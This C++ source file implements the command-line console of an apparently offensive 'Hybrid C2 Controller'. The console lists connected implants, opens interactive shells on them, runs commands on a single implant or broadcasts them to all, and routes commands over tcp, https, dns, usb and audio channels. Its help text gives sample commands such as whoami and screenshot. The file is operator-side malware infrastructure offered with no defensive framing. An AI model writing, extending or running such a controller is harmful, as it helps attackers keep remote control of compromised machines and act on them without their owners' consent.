#include "cli/console.h"

#include <iomanip>
#include <sstream>
#include <algorithm>

CLIManager::CLIManager(Handlers handlers)
    : handlers_(std::move(handlers)), running_(false) {
}

bool CLIManager::Run(std::istream& in, std::ostream& out) {
    running_ = true;
    std::string input;

    while (running_ && std::getline(in, input)) {
        if (!ProcessInput(input, out)) break;
    }

    return true;
}

bool CLIManager::ProcessInput(const std::string& input, std::ostream& out) {
    if (input.empty()) return true;

    auto tokens = Tokenize(input);
    if (tokens.empty()) return true;

    const std::string& cmd = tokens[0];

    if (cmd == "help") {
        PrintHelp(out);
        return true;
    }

    if (cmd == "list" || cmd == "implants") {
        if (handlers_.listImplants) handlers_.listImplants();
        return true;
    }

    if (cmd == "info") {
        if (tokens.size() >= 2) {
            if (handlers_.implantInfo) handlers_.implantInfo(tokens[1]);
        } else {
            out << "[!] Missing implant ID" << std::endl;
        }
        return true;
    }

    if (cmd == "interact") {
        if (tokens.size() >= 2) {
            if (handlers_.interactShell) handlers_.interactShell(tokens[1]);
        } else {
            out << "[!] Missing implant ID" << std::endl;
        }
        return true;
    }

    if (cmd == "exec") {
        if (tokens.size() >= 3) {
            std::string target = tokens[1];
            std::string command = input.substr(input.find(tokens[2]));
            std::string channel = tokens.size() >= 4 ? tokens[3] : "auto";
            if (tokens.size() >= 4) {
                auto pos = command.rfind(tokens[3]);
                if (pos != std::string::npos && pos + tokens[3].size() == command.size()) {
                    command.resize(pos);
                    while (!command.empty() && std::isspace(static_cast<unsigned char>(command.back()))) {
                        command.pop_back();
                    }
                }
            }
            if (handlers_.executeCommand) handlers_.executeCommand(target, command, channel);
        } else {
            out << "[!] Usage: exec <id> <command> [channel]" << std::endl;
        }
        return true;
    }

    if (cmd == "broadcast") {
        if (tokens.size() >= 2) {
            std::string command = input.substr(input.find(tokens[1]));
            if (handlers_.executeCommand) handlers_.executeCommand("all", command, "auto");
        } else {
            out << "[!] Usage: broadcast <command>" << std::endl;
        }
        return true;
    }

    if (cmd == "usb_status") {
        if (handlers_.checkUSBStatus) handlers_.checkUSBStatus();
        return true;
    }

    if (cmd == "usb_pack") {
        if (tokens.size() >= 3) {
            std::string target = tokens[1];
            std::string command = input.substr(input.find(tokens[2]));
            if (handlers_.executeCommand) handlers_.executeCommand(target, command, "usb");
        } else {
            out << "[!] Usage: usb_pack <id> <command>" << std::endl;
        }
        return true;
    }

    if (cmd == "usb_results") {
        if (handlers_.checkUSBResults) handlers_.checkUSBResults();
        return true;
    }

    if (cmd == "stats") {
        if (handlers_.showStatistics) handlers_.showStatistics();
        return true;
    }

    if (cmd == "set") {
        if (tokens.size() >= 3) {
            if (handlers_.setConfig) handlers_.setConfig(tokens[1], tokens[2]);
        } else {
            out << "[!] Usage: set <key> <value>" << std::endl;
        }
        return true;
    }

    if (cmd == "save") {
        if (handlers_.saveConfig) handlers_.saveConfig();
        return true;
    }

    if (cmd == "exit" || cmd == "quit") {
        if (handlers_.shutdown) handlers_.shutdown();
        running_ = false;
        return false;
    }

    out << "[!] Unknown command. Type 'help'" << std::endl;
    return true;
}

void CLIManager::PrintHelp(std::ostream& out) const {
    out << R"(
+---------------------------------------------------------------+
|  HYBRID C2 CONTROLLER - COMMAND REFERENCE                     |
+---------------------------------------------------------------+
|                                                               |
|  IMPLANT MANAGEMENT:                                          |
|    list / implants               - List all connected implants |
|    info <id>                    - Detailed implant info      |
|    interact <id>                - Interactive shell          |
|                                                               |
|  COMMAND EXECUTION:                                           |
|    exec <id> <command> [ch]     - Execute on specific implant |
|    broadcast <command>          - Execute on ALL implants    |
|                                                               |
|  CHANNEL CONTROL:                                             |
|    Channels: tcp, https, dns, usb, audio, auto                |
|    usb_status                   - Check USB drive status     |
|    usb_pack <id> <cmd>          - Send command via USB       |
|    usb_results                  - Read USB results           |
|                                                               |
|  CONFIGURATION:                                               |
|    set <key> <value>            - Change settings            |
|    save                         - Save configuration         |
|    stats                        - Show statistics            |
|                                                               |
|  COMMAND EXAMPLES:                                            |
|    exec ABC123 sysinfo                                      |
|    exec ABC123 "exec whoami" usb                         |
|    broadcast screenshot                                    |
|    interact ABC123                                         |
|                                                               |
+---------------------------------------------------------------+
)" << std::endl;
}

std::vector<std::string> CLIManager::Tokenize(const std::string& input) {
    std::vector<std::string> tokens;
    std::istringstream iss(input);
    std::string token;

    while (iss >> std::quoted(token)) {
        tokens.push_back(token);
    }

    if (tokens.empty()) {
        std::istringstream iss2(input);
        while (iss2 >> token) {
            tokens.push_back(token);
        }
    }

    return tokens;
}
